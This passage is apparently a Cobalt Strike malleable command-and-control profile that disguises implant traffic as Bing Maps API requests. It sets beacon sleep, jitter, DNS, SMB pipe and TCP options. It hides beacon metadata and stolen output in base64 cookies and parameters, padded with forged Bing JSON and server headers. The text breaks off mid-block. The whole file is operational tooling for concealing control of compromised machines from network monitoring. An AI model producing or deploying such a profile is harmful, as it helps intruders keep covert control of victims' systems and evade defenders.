#bing maps profile
#xx0hcd

###Global Options###
set sample_name "bing_maps.profile";

set sleeptime "38500";
set jitter    "27";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";

set host_stage "false";

###DNS options###
set dns_idle "8.8.8.8";
set maxdns    "245";
set dns_sleep "0";
set dns_stager_prepend "";
set dns_stager_subhost "";
set dns_max_txt "252";
set dns_ttl "1";

###SMB options###
set pipename "ntsvcs";
set pipename_stager "scerpc";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH BANNER###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";

###SSL Options###
#https-certificate {
#    set keystore "domain001.store";
#    set password "password123";
#}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
#http-config {
#    set headers "Server, Content-Type";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Server" "nginx";
#
#    set trust_x_forwarded_for "false";
#}

###HTTP-GET Block###
http-get {

    set uri "/maps/overlaybfpr";
    
    client {

        header "Host" "www.bing.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Connection" "close";

	   
    metadata {
        base64;
	
	prepend "_SS=";
	prepend "SRCHD=AF=NOFORM;";
        header "Cookie";

    }

	parameter "q" "san%20diego%20ca%20zoo";

    }

    server {
    
        header "Cache-Control" "public";
        header "Content-Type" "text/html;charset=utf-8";
        header "Vary" "Accept-Encoding";
        header "P3P" "\"NON UNI COM NAV STA LOC CURa DEVa PSAa PSDa OUR IND\"";
        header "X-MSEdge-Ref" "Ref A: 20D7023F4A1946FEA6E17C00CC8216CF Ref B: DALEDGE0715";
        header "Connection" "close";
 
        output {

            base64;
            
            prepend "{";
            prepend "    \"_type\": \"Suggestions\",";
            prepend "    \"instrumentation\": {";
            prepend "        \"pingUrlBase\": \"https://www.bing.com/api/ping?IG=22592B48742E48B7B855897EE3CA6400&CID=34823DAF741A65682A9032BA75E66427&ID=\",";
            prepend "        \"pageLoadPingUrl\": \"https://www.bing.com/api/ping/pageload?IG=22592B48742E48B7B855897EE3CA6400&CID=34823DAF741A65682A9032BA75E66427&Type=Event.CPT&DATA=0\"";
            prepend "    },";
            prepend "    \"queryContext\": {";
            prepend "        \"originalQuery\": \"san diego ca zoo\"";
            prepend "    },";
            prepend "    \"value\": [{";
            prepend "        \"_type\": \"Place\",";
            prepend "        \"id\": \"sid:\"";

            append "        \"readLink\": \"https://www.bing.com/api/v6/localentities/dbb1c326-5b67-4591-a264-0929e070e5ee\",";
            append "        \"readLinkPingSuffix\": \"DevEx,5018.1\",";
            append "        \"entityPresentationInfo\": {";
            append "            \"entityScenario\": \"ListItem\",";
            append "            \"entitySubTypeHints\": [\"PopulatedPlace\"]";
            append "        },";
            append "        \"geo\": {";
            append "            \"latitude\": 32.7157,";
            append "            \"longitude\": -117.162";
            append "        },";
            append "        \"address\": {";
            append "            \"addressLocality\": \"San Diego\",";
            append "            \"addressSubregion\": \"San Diego County\",";
            append "            \"addressRegion\": \"California\",";
            append "            \"addressCountry\": \"United States\",";
            append "            \"countryIso\": \"US\",";
            append "            \"text\": \"San Diego, California\"";
            append "        },";
            append "        \"formattingRuleId\": \"US\"";
            append "    }, {";
            append "        \"_type\": \"LocalBusiness\",";
            append "        \"id\": \"local_ypid:\"YN873x13020856635161814\"\",";
            append "        \"readLink\": \"https://www.bing.com/api/v6/localbusinesses/YN873x13020856635161814\",";
            append "        \"readLinkPingSuffix\": \"DevEx,5019.1\",";
            append "        \"name\": \"San Diego Zoo\",";
            append "        \"geo\": {";
            append "            \"latitude\": 32.7353,";
            append "            \"longitude\": -117.149";
            append "        },";
            append "        \"address\": {";
            append "            \"streetAddress\": \"2920 Zoo Dr\",";
            append "            \"addressLocality\": \"San Diego\",";
            append "            \"addressRegion\": \"CA\",";
            append "            \"postalCode\": \"92101\",";
            append "            \"addressCountry\": \"United States\",";
            append "            \"countryIso\": \"US\",";
            append "            \"text\": \"2920 Zoo Dr, San Diego, CA 92101\"";
            append "        },";
            append "        \"formattingRuleId\": \"US\",";
            append "        \"categories\": [\"90000.90001.90012.90017\"]";
            append "    }, {";
            append "        \"_type\": \"Place\",";
            append "        \"id\": \"sid:\"63101d85-2568-910b-fee1-2518175b6a48\"\",";
            append "        \"readLink\": \"https://www.bing.com/api/v6/localentities/63101d85-2568-910b-fee1-2518175b6a48\",";
            append "        \"readLinkPingSuffix\": \"DevEx,5020.1\",";
            append "        \"entityPresentationInfo\": {";
            append "            \"entityScenario\": \"ListItem\",";
            append "            \"entitySubTypeHints\": [\"PopulatedPlace\"]";
            append "        },";
            append "        \"geo\": {";
            append "            \"latitude\": 10.2573,";
            append "            \"longitude\": -67.9548";
            append "        },";
            append "        \"address\": {";
            append "            \"addressLocality\": \"San Diego\",";
            append "            \"addressRegion\": \"Carabobo\",";
            append "            \"addressCountry\": \"Venezuela\",";
            append "            \"countryIso\": \"VE\",";
            append "            \"text\": \"San Diego, Carabobo\"";
            append "        }";

            print;
        }
    }
}



###HTTP-Post Block###
http-post {
    
    set uri "/fd/ls/lsp.aspx";
    #set verb "GET";
    set verb "POST";

    client {

	header "Host" "www.bing.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Content-Type" "text/xml";
	header "Connection" "close";
        
        output {
            base64url;
            
            prepend "SRCHUID=";
            prepend "SRCHD=AF=NOFORM;";
	    header "Cookie";
        }

        id {
	    base64url;
            parameter "lid";

        }
    }

    server {
    
        header "Cache-Control" "public, max-age=31536000";
        header "Content-Type" "application/json";
        header "Vary" "Accept-Encoding";
        header "X-Cache" "TCO_HIT";
        header "Server" "Microsoft-IIS/10.0";
        header "X-AspNet-Version" "4.0.30319";
        header "X-Powered-By" "ASP.NET";

        output {
            netbios;	    
	   
            prepend "    \"categoryMap\": [";
            prepend "        {";
            prepend "            \"categoryId\": 91263,";
            prepend "            \"bucketId\": 1848,";
            prepend "            \"entry\": \"CommunityPoint\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 90892,";
            prepend "            \"bucketId\": 1899,";
            prepend "            \"entry\": \"Transit\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 90014,";
            prepend "            \"bucketId\": 300,";
            prepend "            \"entry\": \"ZXlJeE5DSTZleUoyWldOMGIzSkpiV0ZuWlNJNmV5SnlaV052Y21SeklqcGJleUp6WTJGc1pWQmhiR1YwZEdWTFpYbEpaQ0k2TFRFc0luTm9ZWEJsVUdGc1pYUjBaVXRsZVVsa0lqb3RNU3dpWjJWdmJXVjBjbmxUZEhKcGJtY2lPaUpOTWk0Mk56Z3NNVEJvTFRVdU16VTFWall1TlROb0xUTXVNalFnSUdNdE1DNDVPREVzTUM0d01qSXRNUzQzTlMwd0xqTTVOQzB5TGpFNE1TMHhMakE1TW1NdE1DNHpNamN0TUM0MU16TXRNQzQxT0RNdE1TNDBORElzTUM0d056SXRNaTQzTld3d0xqRXpOeTB3TGpJek1Xd3hMalU0T1MweUxqSXlNaUFnWXkwd0xqSTFOUzB3TGpFNE15MHdMalEyTmkwd0xqUXhPQzB3TGpZeE9TMHdMamN3TVdNdE1DNDBORElzTUM0d056SXRNaTQzTld3d0xqQTVPUzB5TGpVek4yd3lMamN6T0MwMExqRTVPRU10TVM0M05TMHhNeTR5TnkweExqQXlPQzB4TkN3d0xqQXhPQzB4TkdNd0xqWXdPU3d3TERFdU5EYzRMREF1TWpVMExESXVNVFU0TERFdU5EVTViREl1T0RFM0xEUXVPRGNnSUdNd0xqRXhOU3d3TGpRNE1pd3dMakE1TXl3eExqRTNPUzB3TGpJNE1Td3hMamM1T0d3eExqZzBOU3d5TGpZek0yTXdMalExT1N3d0xqY3pOU3d3TGpjd09Dd3hMamMyTWl3d0xqRTVOU3d5TGpZNE0wTTJMall4Tmkwd0xqTXhNeXcyTGpReE1pMHdMakExTVN3MkxqRXdPU3d3TGpFM01pQWdiREl1TURFekxESXVOemMwUXpndU5EUTFMRE11TlRjeExEZ3VOakU0TERRdU5UUXNPQzR4TWpZc05TNHpOemhqTFRBdU1qUXpMREF1TkRFekxUQXVPRFExTERFdU1URXpMVEl1TVRVc01TNHhOVFJJTWk0Mk56aFdNVEI2SWl3aVptbHNiRlpoYkhWbFNXUWlPakkwTENKemRISnZhMlZXWVd4MVpVbGtJam94TENKemRISnZhMlZYYVdSMGFDSTZNU3dpYzNSeWIydGxVMk5oYkdWUVlXeGxkSFJsUzJWNVNXUWlPakkwTENKemRISnZhMlZMWlhsSlpDSTZMVEVzSW5KbFkyOXlaRlI1Y0dVaU9pSlFZWFJvSW4wPQ==\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 90595,";
            prepend "            \"bucketId\": 311,";
            prepend "            \"entry\": \"RealEstatePoint\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 91616,";
            prepend "            \"bucketId\": 257,";
            prepend "            \"entry\": \"AquariumPoint\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 90954,";
            prepend "            \"bucketId\": 277,";
            prepend "            \"entry\": \"ArtGalleryPoint\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 90001,";
            prepend "            \"bucketId\": 258,";
            prepend "            \"entry\": \"UEhOamNtbHdkQ0IwZVhCbFBTSjBaWGgwTDJwaGRtRnpZM0pwY0hRaUlHTnliM056YjNKcFoybHVQU0poYm05dWVXMXZkWE1pSUhOeVl6MGlMM0p3TDBScWNrUjZOMU5ZYlhOMWRYZHhRMlI1WldsdlFsWXpPWGhKV1M1bmVpNXFjeUkrUEM5elkzSnBjSFErUEhOamNtbHdkQ0IwZVhCbFBTSjBaWGgwTDJwaGRtRnpZM0pwY0hRaVBnPT0=\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 90133,";
            prepend "            \"bucketId\": 278,";
            prepend "            \"entry\": \"ATMPoint\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 90078,";
            prepend "            \"bucketId\": 330,";
            prepend "            \"entry\": \"AutomobileRepairPoint\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 91186,";
            prepend "            \"bucketId\": 327,";
            prepend "            \"entry\": \"FoodPoint\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 90122,";
            prepend "            \"bucketId\": 279,";
            prepend "            \"entry\": \"BankPoint\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 90243,";
            prepend "            \"bucketId\": 284,";
            prepend "            \"entry\": \"BarPoint\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 91204,";
            prepend "            \"bucketId\": 308,";
            prepend "            \"entry\": \"BarAndGrillPoint\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 91576,";
            prepend "            \"bucketId\": 1851,";
            prepend "            \"entry\": \"AttractionPoint\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 90353,";
            prepend "            \"bucketId\": 1972,";
            prepend "            \"entry\": \"ZXlKelkyRnNaVkJoYkdWMGRHVkxaWGxKWkNJNkxURXNJbk5vWVhCbFVHRnNaWFIwWlV0bGVVbGtJam90TVN3aVoyVnZiV1YwY25sVGRISnBibWNpT2lKTkxUSXVNalUwTFRZdU16ZzNZekFzTUMweExqZzJPU3d3TGpNd015MHhMakE0T1MweExqRXhPR3d5TGpjME1TMDBMakU1TTJNd0xEQXNNQzQxTkMweExqTXlMREV1TWpnMExEQnNNaTQyTkRNc05DNDBNeUFnWXpBc01Dd3dMakl5TVN3d0xqa3hOQzB4TGpBMk9Dd3dMamc0TVd3eUxqZzVOQ3cwTGpFek1XTXdMREFzTUM0M056TXNNUzR5TlMwd0xqazFNU3d4TGpJMVNETXVNVEUzYkRNdU5EZ3lMRFF1TnpReVl6QXNNQ3d3TGpVME1pd3hMakEwTkMwd0xqWTNOU3d4TGpBNE1rZ3dMamsyTkhZekxqUTJPQ0FnYUMweExqa3lOM1l0TXk0ME4yZ3ROQzQ1TlRSak1Dd3dMVEV1TXpJc01DNHhNamN0TUM0MU56WXRNUzR6TmpGc015NHlNelV0TkM0MU1qWm9MVEV1TlRjM1l6QXNNQzB4TGpJeE55d3dMakUyTlMwd0xqSXpOUzB4TGpNeU0wd3RNaTR5TlRRdE5pNHpPRGNpTENKbWFXeHNWbUZzZFdWSlpDSTZNalVzSW5OMGNtOXJaVlpoYkhWbFNXUWlPakVzSW5OMGNtOXJaVmRwWkhSb0lqb3hMQ0p6ZEhKdmEyVlRZMkZzWlZCaGJHVjBkR1ZMWlhsSlpDSTZMVEVzSW5KbFkyOXlaRlI1Y0dVaU9pSlFZWFJvSW4wPQ==\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 90940,";
            prepend "            \"bucketId\": 329,";
            prepend "            \"entry\": \"MarinaPoint\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 90650,";
            prepend "            \"bucketId\": 1365,";
            prepend "            \"entry\": \"BookstorePoint\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 91533,";
            prepend "            \"bucketId\": 271,";
            prepend "            \"entry\": \"BowlingPoint\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 91647,";
            prepend "            \"bucketId\": 1382,";
            prepend "            \"entry\": \"ZXlJeU1EWWlPbnNpZG1WamRHOXlTVzFoWjJVaU9uc2ljbVZqYjNKa2N5STZXM3NpYzJOaGJHVlFZV3hsZEhSbFMyVjVTV1FpT2pFNU9Td2ljMmhoY0dWUVlXeGxkSFJsUzJWNVNXUWlPakl3TUN3aVoyVnZiV1YwY25sVGRISnBibWNpT2lKTk1USXVOUzA1YUMweU5TNHhZeTB4TGpjc01DMHpMakVzTVM0MExUTXVNU3d6TGpGV05TNDVZekFzTVM0M0xERXVOQ3d6TGpFc015NHhMRE11TVdneU5TNHhJQ0FnWXpFdU55d3dMRE11TVMweExqUXNNeTR4TFRNdU1WWXROUzQ1UXpFMUxqWXROeTQyTERFMExqI"
            prepend "XRPU3d4TWk0MUxUbDZJQ0lzSW1acGJHeFdZV3gxWlVsa0lqb3lNU3dpYzNSeWIydGxWbUZzZFdWSlpDSTZNU3dpYzNSeWIydGxWMmxrZEdnaU9qRXNJbk4wY205clpWTmpZV3hsVUdGc1pYUjBaVXRsZVVsa0lqb3RNU3dpY21WamIzSmtWSGx3WlNJNklsQmhkR2dpZlE9PQ=\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 255,";
            prepend "            \"bucketId\": 254,";
            prepend "            \"entry\": \"Transit\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 257,";
            prepend "            \"bucketId\": 253,";
            prepend "            \"entry\": \"Transit\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 264,";
            prepend "            \"bucketId\": 243,";
            prepend "            \"entry\": \"Transit\"";
            prepend "        },";
            prepend "        {";
            prepend "            \"categoryId\": 263,";
            prepend "            \"bucketId\": 241,";
            prepend "            \"entry\": ";

            append "        },";
            append "        {";
            append "            \"categoryId\": 266,";
            append "            \"bucketId\": 236,";
            append "            \"entry\": \"Transit\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 251,";
            append "            \"bucketId\": 252,";
            append "            \"entry\": \"Transit\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 265,";
            append "            \"bucketId\": 242,";
            append "            \"entry\": \"Transit\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 253,";
            append "            \"bucketId\": 251,";
            append "            \"entry\": \"Transit\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 254,";
            append "            \"bucketId\": 250,";
            append "            \"entry\": \"ZXlJek1DSTZleUoyWldOMGIzSkpiV0ZuWlNJNmV5SnlaV052Y21SeklqcGJleUp6WTJGc1pWQmhiR1YwZEdWTFpYbEpaQ0k2TkRJNUxDSnphR0Z3WlZCaGJHVjBkR1ZMWlhsSlpDSTZORE13TENKblpXOXRaWFJ5ZVZOMGNtbHVaeUk2SWsweE15MHdMakF4TkRZeE1ESTVZekFzTWk0eE9UZ3RNU3cwTGpFek1TMHlMalV4TWl3MUxqSTRNVU0zTGpjeU5pdzNMakUzTWpNNUxETXVOelUwTERjdU9UZzFNemtzTUN3M0xqazROVE01Y3kwM0xqY3lOaTB3TGpneE15MHhNQzQwT0RndE1pNDNNVGxETFRFeUxEUXVNVEUyTXprdE1UTXNNaTR4T0RNek9TMHhNeTB3TGpBeE5EWXhNREk1WXpBdE1pNHhPVGNzTVMwMExqRXpNaXd5TGpVeE1pMDFMakk0TVVNdE55NDNNall0Tnk0eU1EQTJNUzB6TGpjMU5DMDRMakF4TkRZeExEQXRPQzR3TVRRMk1YTTNMamN5Tml3d0xqZ3hOQ3d4TUM0ME9EZ3NNaTQzTVRrZ0lFTXhNaTAwTGpFME5qWXhMREV6TFRJdU1qRXhOakVzTVRNdE1DNHdNVFEyTVRBeU9Yb2lMQ0ptYVd4c1ZtRnNkV1ZKWkNJNk5URXNJbk4wY205clpWWmhiSFZsU1dRaU9qVXlMQ0p6ZEhKdmEyVlhhV1IwYUNJNk1Td2ljM1J5YjJ0bFUyTmhiR1ZRWVd4bGRIUmxTMlY1U1dRaU9pMHhMQ0p5WldOdmNtUlVlWEJsSWpvaVVHRjBhQ0o5TEhzaWMyTmhiR1ZRWVd4bGRIUmxTMlY1U1dRaU9qUXpNaXdpYzJoaGNHVlFZV3hsZEhSbFMyVjVTV1FpT2pRek15d2liR1ZtZEZSdmNDSTZleUo0SWpvdE9TNHpOekF4TENKNUlqb3RPQzR3T0RNd01EaDlMQ0p5YVdkb2RFSnZkSFJ2YlNJNmV5SjRJam94TUM0ek56QXhNeXdpZVNJNk9DNHdPRE13TURoOUxDSjBaWGgwVTNSNWJHVWlPbnNpWm05dWRFWmhiV2xzZVVsa0lqbzRMQ0ptYjI1MFUybDZaU0k2T1N3aWJXbHVhVzExYlVadmJuUlRhWHBsSWpvNUxDSm9aV2xuYUhSTllYUmphRTF2WkdVaU9qQXNJbWhsYVdkb2RFMWhkR05vVUdsNFpXeHpJam93TENKbWIyNTBVM1I1YkdVaU9qQXNJblJsZUhSRWNtRjNVMlYwZEdsdVozTWlPakFzSW1OdmJHOXlWbUZzZFdWSlpDSTZOVE1zSW1kc2IzZFRhWHBsSWpvekxDSnpaV052Ym1SSGJHOTNVMmw2WlNJNk9Td2lZV3h3YUdGR2JHOXZjaUk2TVRjMUxDSm5iRzkzUTI5c2IzSldZV3gxWlVsa0lqbzNMQ0p2ZFhSc2FXNWxRMjlzYjNKV1lXeDFaVWxrSWpvM0xDSnZkWFJzYVc1bFYybGtkR2dpT2pCOUxDSnpkSEpwYm1kVGIzVnlZMlZKWkNJNk5ETTBMQ0p6ZEhKcGJtZFRiM1Z5WTJWVWVYQmxJam95TENKb2IzSnBlbTl1ZEdGc1FXeHBaMjV0Wlc1MElqb3dMQ0oyWlhKMGFXTmhiRUZzYVdkdWJXVnVkQ0k2TUN3aWFHOXlhWHB2Ym5SaGJFRjFkRzlUWTJGc2FXNW5Jam94TENKMlpYSjBhV05oYkVGMWRHOVRZMkZzYVc1bklqb3hMQ0p5WldOdmNtUlVlWEJsSWpvaVZHVjRkQ0o5WFgxOWZRPT0=\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 260,";
            append "            \"bucketId\": 229,";
            append "            \"entry\": \"Transit\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 267,";
            append "            \"bucketId\": 226,";
            append "            \"entry\": \"Transit\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 252,";
            append "            \"bucketId\": 249,";
            append "            \"entry\": \"Transit\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 91714,";
            append "            \"bucketId\": 66,";
            append "            \"entry\": \"FinancialPoint\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 203,";
            append "            \"bucketId\": 248,";
            append "            \"entry\": \"ZXlJek16TWlPbnNpZG1WamRHOXlTVzFoWjJVaU9uc2ljbVZqYjNKa2N5STZXM3NpYzJOaGJHVlFZV3hsZEhSbFMyVjVTV1FpT2pFNU9Td2ljMmhoY0dWUVlXeGxkSFJsUzJWNVNXUWlPakl3TUN3aVoyVnZiV1YwY25sVGRISnBibWNpT2lKTk5TNDVMVGxJTFRVdU9VTXROeTQyTFRrdE9TMDNMall0T1MwMUxqbFdOUzQ1UXkwNUxEY3VOaTAzTGpZc09TMDFMamtzT1VnMUxqbEROeTQyTERrc09TdzNMallzT1N3MUxqbFdMVFV1T1NBZ0lFTTVMVGN1Tml3M0xqWXRPU3cxTGprdE9VdzFMamt0T1hvZ0lpd2labWxzYkZaaGJIVmxTV1FpT2pJeExDSnpkSEp2YTJWV1lXeDFaVWxrSWpveExDSnpkSEp2YTJWWGFXUjBhQ0k2TVN3aWMzUnliMnRsVTJOaGJHVlFZV3hsZEhSbFMyVjVTV1FpT2kweExDSnlaV052Y21SVWVYQmxJam9pVUdGMGFDSjlMSHNpYzJOaGJHVlFZV3hsZEhSbFMyVjVTV1FpT2pJd01pd2ljMmhoY0dWUVlXeGxkSFJsUzJWNVNXUWlPakl3TUN3aVoyVnZiV1YwY25sVGRISnBibWNpT2lKTkxUY3VOeXcxTGpsak1Dd3hMREF1T0N3eExqZ3NNUzQ0TERFdU9FZzFMamxqTVN3d0xERXVPQzB3TGpnc01TNDRMVEV1T0ZZdE5TNDVZekF0TVMwd0xqZ3RNUzQ0TFRFdU9DMHhMamhJTFRVdU9TQWdJQ0JqTFRFc01DMHhMamdzTUM0NExURXVPQ3d4TGpoV05TNDVlaUFnSWl3aVptbHNiRlpoYkhWbFNXUWlPakl5TENKemRISnZhMlZXWVd4MVpVbGtJam94TENKemRISnZhMlZYYVdSMGFDSTZNU3dpYzNSeWIydGxVMk5oYkdWUVlXeGxkSFJsUzJWNVNXUWlPaTB4TENKeVpXTnZjbVJVZVhCbElqb2lVR0YwYUNKOUxIc2ljMk5oYkdWUVlXeGxkSFJsUzJWNVNXUWlPakl3TkN3aWMyaGhjR1ZRWVd4bGRIUmxTMlY1U1dRaU9qSXdOU3dpWjJWdmJXVjBjbmxUZEhKcGJtY2lPaUpOTWk0MUxEWXVNMmd5TGpOTU1pNDJMRE11Tm1Nd0xqWXRNQzR4TERFdE1DNHpMREV0TUM0NFl6QXNNQ3d3TFRJdU1Td3dMakV0TXk0Mll6QXVNUzB4TGpjc01DMHlMaklzTUMweUxqSkRNeTQzTFRNdU55d3pMakl0TkM0eUxESXVOQzAwTGpJZ0lDQm9MVEoyTFRFdU1XZ3lMakYyTFRBdU9XZ3ROUzR6ZGpBdU9XZ3lMakYyTVM0eGFDMHhMamxqTFRBdU9Dd3dMVEV1TWl3d0xqVXRNUzQwTERFdU1tTXdMREFzTUN3d0xqY3NNQ3d5TGpKak1DNHhMREV1Tml3d0xqRXNNeTQxTERBdU1Td3pMalZqTUN3d0xqWXNNQzQxTERBdU9Td3hMakVzTUM0NUlDQWdiQzB5TGpJc01pNDJhREl1TTJ3eExqUXRNaTQyYURJdU1rd3lMalVzTmk0emVpQk5NaTQxTERJdU1XTXdMREF1TkMwd0xqTXNNQzQzTFRBdU55d3dMamRETVM0MExESXVPQ3d4TERJdU5Dd3hMREl1TVhNd0xqTXRNQzQzTERBdU55MHdMamRETWk0eExERXVNeXd5TGpVc01TNDNMREl1TlN3eUxqRjZJQ0FnSUUwdE1pNDBMVEl1TldNd0xUQXVNaXd3TGpJdE1DNDBMREF1TkMwd0xqUm9OR013TGpJc01Dd3dMalFzTUM0eUxEQXVOQ3d3TGpSMk15NHhhQzAwTGpoRExUSXVOQ3d3TGpZdE1pNDBMVEl1TlMweUxqUXRNaTQxZWlCTkxURXVOeXd4TGpORExURXVNeXd4TGpNdE1Td3hMamN0TVN3eUxqRWdJQ0J6TFRBdU15d3dMamN0TUM0M0xEQXVOMk10TUM0MExEQXRNQzQzTFRBdU15MHdMamN0TUM0M1F5MHlMalVzTVM0M0xUSXVNU3d4TGpNdE1TNDNMREV1TTNvZ0lpd2labWxzYkZaaGJIVmxTV1FpT2pJekxDSnpkSEp2YTJWV1lXeDFaVWxrSWpveExDSnpkSEp2YTJWWGFXUjBhQ0k2TVN3aWMzUnliMnRsVTJOaGJHVlFZV3hsZEhSbFMyVjVTV1FpT2kweExDSnlaV052Y21SVWVYQmxJam9pVUdGMGFDSjlYWDE5ZlE9PQ==\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 91754,";
            append "            \"bucketId\": 65,";
            append "            \"entry\": \"Transit\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 205,";
            append "            \"bucketId\": 247,";
            append "            \"entry\": \"Transit\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 91649,";
            append "            \"bucketId\": 281,";
            append "            \"entry\": \"CafePoint\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 91562,";
            append "            \"bucketId\": 1366,";
            append "            \"entry\": \"CampPoint\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 90977,";
            append "            \"bucketId\": 331,";
            append "            \"entry\": \"\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 90903,";
            append "            \"bucketId\": 274,";
            append "            \"entry\": \"AutomobileRentalPoint\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 90024,";
            append "            \"bucketId\": 303,";
            append "            \"entry\": \"CasinoPoint\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 91622,";
            append "            \"bucketId\": 1839,";
            append "            \"entry\": \"AttractionPoint\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 91252,";
            append "            \"bucketId\": 1846,";
            append "            \"entry\": \"PalacePoint\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 90619,";
            append "            \"bucketId\": 1847,";
            append "            \"entry\": \"ZXlJek5qTWlPbnNpZG1WamRHOXlTVzFoWjJVaU9uc2ljbVZqYjNKa2N5STZXM3NpYzJOaGJHVlFZV3hsZEhSbFMyVjVTV1FpT2pFek5EZ3NJbk5vWVhCbFVHRnNaWFIwWlV0bGVVbGtJam94TXpRNUxDSmpXQ0k2TUN3aVkxa2lPakFzSW5KWUlqb3dMQ0p5V1NJNk1Dd2lZMjlzYjNKV1lXeDFaVWxrSWpveU56Y3NJbXh2WTJ0WFNGSmhkR2x2SWpwMGNuVmxMQ0p5WldOdmNtUlVlWEJsSWpvaVJtbHNiR1ZrUld4c2FYQnpaU0o5TEhzaWMyTmhiR1ZRWVd4bGRIUmxTMlY1U1dRaU9qRXpORGdzSW5Ob1lYQmxVR0ZzWlhSMFpVdGxlVWxrSWpveE16UTVMQ0pqV0NJNk1Dd2lZMWtpT2pBc0luSllJam93TENKeVdTSTZNQ3dpYkdsdVpWTjBlV3hsSWpwN0ltTnZiRzl5Vm1Gc2RXVkpaQ0k2TWpjNExDSnpkSEp2YTJWWGFXUjBhQ0k2TVN3aVpHRnphR1Z6VEdsemRDSTZXMTBzSW1OdmJYQnZkVzVrUVhKeVlYbE1hWE4wSWpwYlhYMHNJbXh2WTJ0WFNGSmhkR2x2SWpwMGNuVmxMQ0p6ZEhKdmEyVlRZMkZzWlZCaGJHVjBkR1ZMWlhsSlpDSTZNVE0xTVN3aWNtVmpiM0prVkhsd1pTSTZJa1ZzYkdsd2MyVWlmU3g3SW5OallXeGxVR0ZzWlhSMFpVdGxlVWxrSWpveE16VXpMQ0p6YUdGd1pWQmhiR1YwZEdWTFpYbEpaQ0k2TVRNMU5Dd2laMlZ2YldWMGNubFRkSEpwYm1jaU9pSk5OQzQwTFRNdU5tTXdMakl0TUM0eUxEQXVNaTB3TGpVc01DMHdMamRqTFRBdU1pMHdMakl0TUM0MUxUQXVNaTB3TGpjc01Fd3dMamd0TVM0MWFERXVORU15TGpJdE1TNDFMRFF1TkMwekxqWXNOQzQwTFRNdU5ub2dUVFF0TUM0MWFDMDRJQ0JqTFRBdU15d3dMVEF1TlN3d0xqSXRNQzQxTERBdU5XTXdMREl1TlN3eUxEUXVOU3cwTGpVc05DNDFjelF1TlMweUxEUXVOUzAwTGpWRE5DNDFMVEF1TXl3MExqTXRNQzQxTERRdE1DNDFlaUJOTVN3eUxqVklNQzQxVmpOak1Dd3dMak10TUM0eUxEQXVOUzB3TGpVc01DNDFJQ0JUTFRBdU5Td3pMak10TUM0MUxETldNaTQxU0MweFl5MHdMak1zTUMwd0xqVXRNQzR5TFRBdU5TMHdMalZUTFRFdU15d3hMalV0TVN3eExqVm9NQzQxVmpGak1DMHdMak1zTUM0eUxUQXVOU3d3TGpVdE1DNDFVekF1TlN3d0xqY3NNQzQxTERGMk1DNDFTREVnSUdNd0xqTXNNQ3d3TGpVc01DNHlMREF1TlN3d0xqVlRNUzR6TERJdU5Td3hMREl1TlhvaUxDSm1hV3hzVm1Gc2RXVkpaQ0k2TWpjNUxDSnpkSEp2YTJWV1lXeDFaVWxrSWpveExDSnpkSEp2YTJWWGFXUjBhQ0k2TVN3aWMzUnliMnRsVTJOaGJHVlFZV3hsZEhSbFMyVjVTV1FpT2kweExDSnlaV052Y21SVWVYQmxJam9pVUdGMGFDSjlYWDE5ZlE9PQ===\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 91703,";
            append "            \"bucketId\": 1849,";
            append "            \"entry\": \"CommunityPoint\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 90386,";
            append "            \"bucketId\": 1367,";
            append "            \"entry\": \"ClinicPoint\"";
            append "        },";
            append "        {";
            append "            \"categoryId\": 90188,";
            append "            \"bucketId\": 295,";
